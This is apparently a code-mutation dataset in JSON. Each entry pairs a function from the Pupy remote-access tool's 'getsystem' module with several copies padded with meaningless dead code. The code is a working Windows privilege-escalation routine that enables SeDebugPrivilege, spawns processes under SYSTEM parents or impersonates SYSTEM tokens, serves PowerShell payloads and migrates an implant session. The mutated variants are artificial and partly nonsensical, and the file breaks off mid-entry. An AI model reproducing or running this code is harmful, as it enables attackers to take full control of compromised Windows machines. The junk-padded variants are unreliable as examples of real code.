[
    {
        "func_name": "init_argparse",
        "original": "@classmethod\ndef init_argparse(cls):\n    cls.arg_parser = PupyArgumentParser(prog='getsystem', description=cls.__doc__)\n    cls.arg_parser.add_argument('-m', '--method', dest='method', choices=['impersonate', 'inheritance'], default=None, help='Method for gaining a new pupy session as SYSTEM', required=True)\n    cls.arg_parser.add_argument('-x', dest='execute', default=None, help='Change the default process to create/inject into')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Relaunch current executable as system (dangerous)')\n    cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help='Force to use a powershell payload')\n    cls.arg_parser.add_argument('--ppid', dest='parentID', type=int, default=None, help=\"Force this ppid ('inheritance' method only)\")\n    cls.arg_parser.add_argument('-k', dest='keep', action='store_false', default=True, help=\"Close this current connection after migration ('impersonate' method only)\")\n    cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help=\"Wait n seconds a reverse connection during migration (default: %(default)s) ('impersonate' method only)\")",
        "mutated": [
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n    cls.arg_parser = PupyArgumentParser(prog='getsystem', description=cls.__doc__)\n    cls.arg_parser.add_argument('-m', '--method', dest='method', choices=['impersonate', 'inheritance'], default=None, help='Method for gaining a new pupy session as SYSTEM', required=True)\n    cls.arg_parser.add_argument('-x', dest='execute', default=None, help='Change the default process to create/inject into')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Relaunch current executable as system (dangerous)')\n    cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help='Force to use a powershell payload')\n    cls.arg_parser.add_argument('--ppid', dest='parentID', type=int, default=None, help=\"Force this ppid ('inheritance' method only)\")\n    cls.arg_parser.add_argument('-k', dest='keep', action='store_false', default=True, help=\"Close this current connection after migration ('impersonate' method only)\")\n    cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help=\"Wait n seconds a reverse connection during migration (default: %(default)s) ('impersonate' method only)\")",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    cls.arg_parser = PupyArgumentParser(prog='getsystem', description=cls.__doc__)\n    cls.arg_parser.add_argument('-m', '--method', dest='method', choices=['impersonate', 'inheritance'], default=None, help='Method for gaining a new pupy session as SYSTEM', required=True)\n    cls.arg_parser.add_argument('-x', dest='execute', default=None, help='Change the default process to create/inject into')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Relaunch current executable as system (dangerous)')\n    cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help='Force to use a powershell payload')\n    cls.arg_parser.add_argument('--ppid', dest='parentID', type=int, default=None, help=\"Force this ppid ('inheritance' method only)\")\n    cls.arg_parser.add_argument('-k', dest='keep', action='store_false', default=True, help=\"Close this current connection after migration ('impersonate' method only)\")\n    cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help=\"Wait n seconds a reverse connection during migration (default: %(default)s) ('impersonate' method only)\")",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    cls.arg_parser = PupyArgumentParser(prog='getsystem', description=cls.__doc__)\n    cls.arg_parser.add_argument('-m', '--method', dest='method', choices=['impersonate', 'inheritance'], default=None, help='Method for gaining a new pupy session as SYSTEM', required=True)\n    cls.arg_parser.add_argument('-x', dest='execute', default=None, help='Change the default process to create/inject into')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Relaunch current executable as system (dangerous)')\n    cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help='Force to use a powershell payload')\n    cls.arg_parser.add_argument('--ppid', dest='parentID', type=int, default=None, help=\"Force this ppid ('inheritance' method only)\")\n    cls.arg_parser.add_argument('-k', dest='keep', action='store_false', default=True, help=\"Close this current connection after migration ('impersonate' method only)\")\n    cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help=\"Wait n seconds a reverse connection during migration (default: %(default)s) ('impersonate' method only)\")",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    cls.arg_parser = PupyArgumentParser(prog='getsystem', description=cls.__doc__)\n    cls.arg_parser.add_argument('-m', '--method', dest='method', choices=['impersonate', 'inheritance'], default=None, help='Method for gaining a new pupy session as SYSTEM', required=True)\n    cls.arg_parser.add_argument('-x', dest='execute', default=None, help='Change the default process to create/inject into')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Relaunch current executable as system (dangerous)')\n    cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help='Force to use a powershell payload')\n    cls.arg_parser.add_argument('--ppid', dest='parentID', type=int, default=None, help=\"Force this ppid ('inheritance' method only)\")\n    cls.arg_parser.add_argument('-k', dest='keep', action='store_false', default=True, help=\"Close this current connection after migration ('impersonate' method only)\")\n    cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help=\"Wait n seconds a reverse connection during migration (default: %(default)s) ('impersonate' method only)\")",
            "@classmethod\ndef init_argparse(cls):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    cls.arg_parser = PupyArgumentParser(prog='getsystem', description=cls.__doc__)\n    cls.arg_parser.add_argument('-m', '--method', dest='method', choices=['impersonate', 'inheritance'], default=None, help='Method for gaining a new pupy session as SYSTEM', required=True)\n    cls.arg_parser.add_argument('-x', dest='execute', default=None, help='Change the default process to create/inject into')\n    cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help='Relaunch current executable as system (dangerous)')\n    cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help='Force to use a powershell payload')\n    cls.arg_parser.add_argument('--ppid', dest='parentID', type=int, default=None, help=\"Force this ppid ('inheritance' method only)\")\n    cls.arg_parser.add_argument('-k', dest='keep', action='store_false', default=True, help=\"Close this current connection after migration ('impersonate' method only)\")\n    cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help=\"Wait n seconds a reverse connection during migration (default: %(default)s) ('impersonate' method only)\")"
        ]
    },
    {
        "func_name": "run",
        "original": "def run(self, args):\n    cmdToExecute = None\n    local_file = ''\n    isBindLauncherForPs1 = False\n    listeningAddressPortForBindPs1 = None\n    (launcherType, addressPort) = (self.client.desc['launcher'], self.client.desc['address'])\n    completion = None\n    if launcherType == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))\n        isBindLauncherForPs1 = True\n        self.info('Consequently, powershell option is enabled automatically')\n        args.powershell = True\n    else:\n        self.info(\"The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\")\n        isBindLauncherForPs1 = False\n    if args.powershell:\n        self.info('A powershell payload will be used for getting a pupy session as SYSTEM')\n        clientConfToUse = None\n        if isBindLauncherForPs1:\n            self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))\n            self.info('Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listeningPort = -1\n            while listeningPort == -1:\n                try:\n                    listeningPort = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again. ({})'.format(e))\n            listeningAddress = addressPort.split(':')[0]\n            listeningAddressPortForBindPs1 = '{0}:{1}'.format(listeningAddress, listeningPort)\n            self.info('The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target'.format(listeningAddressPortForBindPs1))\n            bindConf = self.client.get_conf()\n            bindConf['launcher_args'][bindConf['launcher_args'].index('--port') + 1] = str(listeningPort)\n            clientConfToUse = bindConf\n        else:\n            self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')\n            clientConfToUse = self.client.get_conf()\n        (cmdToExecute, completion) = powerloader.serve(self, clientConfToUse)\n    if args.restart:\n        self.info('Trying to configure for running the current executable on the target as SYSTEM')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmdToExecute = self.client.desc['exec_path']\n    if args.method == 'inheritance':\n        if not cmdToExecute:\n            cmdToExecute = args.execute\n        if cmdToExecute is None:\n            self.error('Application to execute with SYSTEM privileges should be specified with one of -x/-p/-r args')\n            return\n        try:\n            enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)\n            enable_privilege('SeDebugPrivilege')\n            self.success('{} enabled'.format('SeDebugPrivilege'))\n        except Exception as e:\n            self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))\n        create_new_process_from_ppid = self.client.remote('pupwinutils.security', 'create_new_process_from_ppid', False)\n        if args.parentID:\n            self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))\n            self.info('Command: {}'.format(cmdToExecute))\n            pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)\n            self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))\n            return\n        else:\n            self.info('Getting information about all processes running on the target')\n            enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')\n            get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)\n            self.info(\"Searching a process with a 'SYSTEM' integrity level\")\n            for aprocess in enum_processes():\n                integrityLevel = get_integrity_level(aprocess['pid'])\n                if not integrityLevel == 'System':\n                    continue\n                self.info(\"{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it\".format(aprocess['name'], aprocess['pid']))\n                try:\n                    pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)\n                    self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))\n                    break\n                except Exception as e:\n                    self.error('Failed: {}'.format(' '.join((x for x in e.args if type(x) is str))))\n    elif args.method == 'impersonate':\n        if cmdToExecute is None:\n            cmdToExecute = args.execute or 'cmd.exe'\n        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)\n        proc_pid = getsystem(cmdToExecute)\n        self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))\n        migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)\n        return\n    if args.powershell:\n        if completion and (not completion.is_set()):\n            self.info('Waiting for PowerLoader completion')\n            completion.wait()\n        if isBindLauncherForPs1:\n            self.success('You have to connect to the target manually on {0}: try \"connect --host {0}\" in pupy shell'.format(listeningAddressPortForBindPs1))\n        else:\n            self.success('Waiting for a connection (take few seconds, 1 min max)...')\n        if local_file:\n            os.remove(local_file)",
        "mutated": [
            "def run(self, args):\n    if False:\n        i = 10\n    cmdToExecute = None\n    local_file = ''\n    isBindLauncherForPs1 = False\n    listeningAddressPortForBindPs1 = None\n    (launcherType, addressPort) = (self.client.desc['launcher'], self.client.desc['address'])\n    completion = None\n    if launcherType == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))\n        isBindLauncherForPs1 = True\n        self.info('Consequently, powershell option is enabled automatically')\n        args.powershell = True\n    else:\n        self.info(\"The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\")\n        isBindLauncherForPs1 = False\n    if args.powershell:\n        self.info('A powershell payload will be used for getting a pupy session as SYSTEM')\n        clientConfToUse = None\n        if isBindLauncherForPs1:\n            self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))\n            self.info('Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listeningPort = -1\n            while listeningPort == -1:\n                try:\n                    listeningPort = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again. ({})'.format(e))\n            listeningAddress = addressPort.split(':')[0]\n            listeningAddressPortForBindPs1 = '{0}:{1}'.format(listeningAddress, listeningPort)\n            self.info('The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target'.format(listeningAddressPortForBindPs1))\n            bindConf = self.client.get_conf()\n            bindConf['launcher_args'][bindConf['launcher_args'].index('--port') + 1] = str(listeningPort)\n            clientConfToUse = bindConf\n        else:\n            self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')\n            clientConfToUse = self.client.get_conf()\n        (cmdToExecute, completion) = powerloader.serve(self, clientConfToUse)\n    if args.restart:\n        self.info('Trying to configure for running the current executable on the target as SYSTEM')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmdToExecute = self.client.desc['exec_path']\n    if args.method == 'inheritance':\n        if not cmdToExecute:\n            cmdToExecute = args.execute\n        if cmdToExecute is None:\n            self.error('Application to execute with SYSTEM privileges should be specified with one of -x/-p/-r args')\n            return\n        try:\n            enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)\n            enable_privilege('SeDebugPrivilege')\n            self.success('{} enabled'.format('SeDebugPrivilege'))\n        except Exception as e:\n            self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))\n        create_new_process_from_ppid = self.client.remote('pupwinutils.security', 'create_new_process_from_ppid', False)\n        if args.parentID:\n            self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))\n            self.info('Command: {}'.format(cmdToExecute))\n            pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)\n            self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))\n            return\n        else:\n            self.info('Getting information about all processes running on the target')\n            enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')\n            get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)\n            self.info(\"Searching a process with a 'SYSTEM' integrity level\")\n            for aprocess in enum_processes():\n                integrityLevel = get_integrity_level(aprocess['pid'])\n                if not integrityLevel == 'System':\n                    continue\n                self.info(\"{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it\".format(aprocess['name'], aprocess['pid']))\n                try:\n                    pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)\n                    self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))\n                    break\n                except Exception as e:\n                    self.error('Failed: {}'.format(' '.join((x for x in e.args if type(x) is str))))\n    elif args.method == 'impersonate':\n        if cmdToExecute is None:\n            cmdToExecute = args.execute or 'cmd.exe'\n        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)\n        proc_pid = getsystem(cmdToExecute)\n        self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))\n        migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)\n        return\n    if args.powershell:\n        if completion and (not completion.is_set()):\n            self.info('Waiting for PowerLoader completion')\n            completion.wait()\n        if isBindLauncherForPs1:\n            self.success('You have to connect to the target manually on {0}: try \"connect --host {0}\" in pupy shell'.format(listeningAddressPortForBindPs1))\n        else:\n            self.success('Waiting for a connection (take few seconds, 1 min max)...')\n        if local_file:\n            os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    cmdToExecute = None\n    local_file = ''\n    isBindLauncherForPs1 = False\n    listeningAddressPortForBindPs1 = None\n    (launcherType, addressPort) = (self.client.desc['launcher'], self.client.desc['address'])\n    completion = None\n    if launcherType == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))\n        isBindLauncherForPs1 = True\n        self.info('Consequently, powershell option is enabled automatically')\n        args.powershell = True\n    else:\n        self.info(\"The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\")\n        isBindLauncherForPs1 = False\n    if args.powershell:\n        self.info('A powershell payload will be used for getting a pupy session as SYSTEM')\n        clientConfToUse = None\n        if isBindLauncherForPs1:\n            self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))\n            self.info('Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listeningPort = -1\n            while listeningPort == -1:\n                try:\n                    listeningPort = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again. ({})'.format(e))\n            listeningAddress = addressPort.split(':')[0]\n            listeningAddressPortForBindPs1 = '{0}:{1}'.format(listeningAddress, listeningPort)\n            self.info('The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target'.format(listeningAddressPortForBindPs1))\n            bindConf = self.client.get_conf()\n            bindConf['launcher_args'][bindConf['launcher_args'].index('--port') + 1] = str(listeningPort)\n            clientConfToUse = bindConf\n        else:\n            self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')\n            clientConfToUse = self.client.get_conf()\n        (cmdToExecute, completion) = powerloader.serve(self, clientConfToUse)\n    if args.restart:\n        self.info('Trying to configure for running the current executable on the target as SYSTEM')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmdToExecute = self.client.desc['exec_path']\n    if args.method == 'inheritance':\n        if not cmdToExecute:\n            cmdToExecute = args.execute\n        if cmdToExecute is None:\n            self.error('Application to execute with SYSTEM privileges should be specified with one of -x/-p/-r args')\n            return\n        try:\n            enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)\n            enable_privilege('SeDebugPrivilege')\n            self.success('{} enabled'.format('SeDebugPrivilege'))\n        except Exception as e:\n            self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))\n        create_new_process_from_ppid = self.client.remote('pupwinutils.security', 'create_new_process_from_ppid', False)\n        if args.parentID:\n            self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))\n            self.info('Command: {}'.format(cmdToExecute))\n            pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)\n            self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))\n            return\n        else:\n            self.info('Getting information about all processes running on the target')\n            enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')\n            get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)\n            self.info(\"Searching a process with a 'SYSTEM' integrity level\")\n            for aprocess in enum_processes():\n                integrityLevel = get_integrity_level(aprocess['pid'])\n                if not integrityLevel == 'System':\n                    continue\n                self.info(\"{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it\".format(aprocess['name'], aprocess['pid']))\n                try:\n                    pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)\n                    self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))\n                    break\n                except Exception as e:\n                    self.error('Failed: {}'.format(' '.join((x for x in e.args if type(x) is str))))\n    elif args.method == 'impersonate':\n        if cmdToExecute is None:\n            cmdToExecute = args.execute or 'cmd.exe'\n        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)\n        proc_pid = getsystem(cmdToExecute)\n        self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))\n        migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)\n        return\n    if args.powershell:\n        if completion and (not completion.is_set()):\n            self.info('Waiting for PowerLoader completion')\n            completion.wait()\n        if isBindLauncherForPs1:\n            self.success('You have to connect to the target manually on {0}: try \"connect --host {0}\" in pupy shell'.format(listeningAddressPortForBindPs1))\n        else:\n            self.success('Waiting for a connection (take few seconds, 1 min max)...')\n        if local_file:\n            os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    cmdToExecute = None\n    local_file = ''\n    isBindLauncherForPs1 = False\n    listeningAddressPortForBindPs1 = None\n    (launcherType, addressPort) = (self.client.desc['launcher'], self.client.desc['address'])\n    completion = None\n    if launcherType == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))\n        isBindLauncherForPs1 = True\n        self.info('Consequently, powershell option is enabled automatically')\n        args.powershell = True\n    else:\n        self.info(\"The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\")\n        isBindLauncherForPs1 = False\n    if args.powershell:\n        self.info('A powershell payload will be used for getting a pupy session as SYSTEM')\n        clientConfToUse = None\n        if isBindLauncherForPs1:\n            self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))\n            self.info('Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listeningPort = -1\n            while listeningPort == -1:\n                try:\n                    listeningPort = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again. ({})'.format(e))\n            listeningAddress = addressPort.split(':')[0]\n            listeningAddressPortForBindPs1 = '{0}:{1}'.format(listeningAddress, listeningPort)\n            self.info('The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target'.format(listeningAddressPortForBindPs1))\n            bindConf = self.client.get_conf()\n            bindConf['launcher_args'][bindConf['launcher_args'].index('--port') + 1] = str(listeningPort)\n            clientConfToUse = bindConf\n        else:\n            self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')\n            clientConfToUse = self.client.get_conf()\n        (cmdToExecute, completion) = powerloader.serve(self, clientConfToUse)\n    if args.restart:\n        self.info('Trying to configure for running the current executable on the target as SYSTEM')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmdToExecute = self.client.desc['exec_path']\n    if args.method == 'inheritance':\n        if not cmdToExecute:\n            cmdToExecute = args.execute\n        if cmdToExecute is None:\n            self.error('Application to execute with SYSTEM privileges should be specified with one of -x/-p/-r args')\n            return\n        try:\n            enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)\n            enable_privilege('SeDebugPrivilege')\n            self.success('{} enabled'.format('SeDebugPrivilege'))\n        except Exception as e:\n            self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))\n        create_new_process_from_ppid = self.client.remote('pupwinutils.security', 'create_new_process_from_ppid', False)\n        if args.parentID:\n            self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))\n            self.info('Command: {}'.format(cmdToExecute))\n            pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)\n            self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))\n            return\n        else:\n            self.info('Getting information about all processes running on the target')\n            enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')\n            get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)\n            self.info(\"Searching a process with a 'SYSTEM' integrity level\")\n            for aprocess in enum_processes():\n                integrityLevel = get_integrity_level(aprocess['pid'])\n                if not integrityLevel == 'System':\n                    continue\n                self.info(\"{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it\".format(aprocess['name'], aprocess['pid']))\n                try:\n                    pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)\n                    self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))\n                    break\n                except Exception as e:\n                    self.error('Failed: {}'.format(' '.join((x for x in e.args if type(x) is str))))\n    elif args.method == 'impersonate':\n        if cmdToExecute is None:\n            cmdToExecute = args.execute or 'cmd.exe'\n        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)\n        proc_pid = getsystem(cmdToExecute)\n        self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))\n        migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)\n        return\n    if args.powershell:\n        if completion and (not completion.is_set()):\n            self.info('Waiting for PowerLoader completion')\n            completion.wait()\n        if isBindLauncherForPs1:\n            self.success('You have to connect to the target manually on {0}: try \"connect --host {0}\" in pupy shell'.format(listeningAddressPortForBindPs1))\n        else:\n            self.success('Waiting for a connection (take few seconds, 1 min max)...')\n        if local_file:\n            os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    cmdToExecute = None\n    local_file = ''\n    isBindLauncherForPs1 = False\n    listeningAddressPortForBindPs1 = None\n    (launcherType, addressPort) = (self.client.desc['launcher'], self.client.desc['address'])\n    completion = None\n    if launcherType == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))\n        isBindLauncherForPs1 = True\n        self.info('Consequently, powershell option is enabled automatically')\n        args.powershell = True\n    else:\n        self.info(\"The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\")\n        isBindLauncherForPs1 = False\n    if args.powershell:\n        self.info('A powershell payload will be used for getting a pupy session as SYSTEM')\n        clientConfToUse = None\n        if isBindLauncherForPs1:\n            self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))\n            self.info('Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listeningPort = -1\n            while listeningPort == -1:\n                try:\n                    listeningPort = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again. ({})'.format(e))\n            listeningAddress = addressPort.split(':')[0]\n            listeningAddressPortForBindPs1 = '{0}:{1}'.format(listeningAddress, listeningPort)\n            self.info('The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target'.format(listeningAddressPortForBindPs1))\n            bindConf = self.client.get_conf()\n            bindConf['launcher_args'][bindConf['launcher_args'].index('--port') + 1] = str(listeningPort)\n            clientConfToUse = bindConf\n        else:\n            self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')\n            clientConfToUse = self.client.get_conf()\n        (cmdToExecute, completion) = powerloader.serve(self, clientConfToUse)\n    if args.restart:\n        self.info('Trying to configure for running the current executable on the target as SYSTEM')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmdToExecute = self.client.desc['exec_path']\n    if args.method == 'inheritance':\n        if not cmdToExecute:\n            cmdToExecute = args.execute\n        if cmdToExecute is None:\n            self.error('Application to execute with SYSTEM privileges should be specified with one of -x/-p/-r args')\n            return\n        try:\n            enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)\n            enable_privilege('SeDebugPrivilege')\n            self.success('{} enabled'.format('SeDebugPrivilege'))\n        except Exception as e:\n            self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))\n        create_new_process_from_ppid = self.client.remote('pupwinutils.security', 'create_new_process_from_ppid', False)\n        if args.parentID:\n            self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))\n            self.info('Command: {}'.format(cmdToExecute))\n            pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)\n            self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))\n            return\n        else:\n            self.info('Getting information about all processes running on the target')\n            enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')\n            get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)\n            self.info(\"Searching a process with a 'SYSTEM' integrity level\")\n            for aprocess in enum_processes():\n                integrityLevel = get_integrity_level(aprocess['pid'])\n                if not integrityLevel == 'System':\n                    continue\n                self.info(\"{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it\".format(aprocess['name'], aprocess['pid']))\n                try:\n                    pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)\n                    self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))\n                    break\n                except Exception as e:\n                    self.error('Failed: {}'.format(' '.join((x for x in e.args if type(x) is str))))\n    elif args.method == 'impersonate':\n        if cmdToExecute is None:\n            cmdToExecute = args.execute or 'cmd.exe'\n        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)\n        proc_pid = getsystem(cmdToExecute)\n        self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))\n        migrate(self, proc_pid, keep=args.keep, 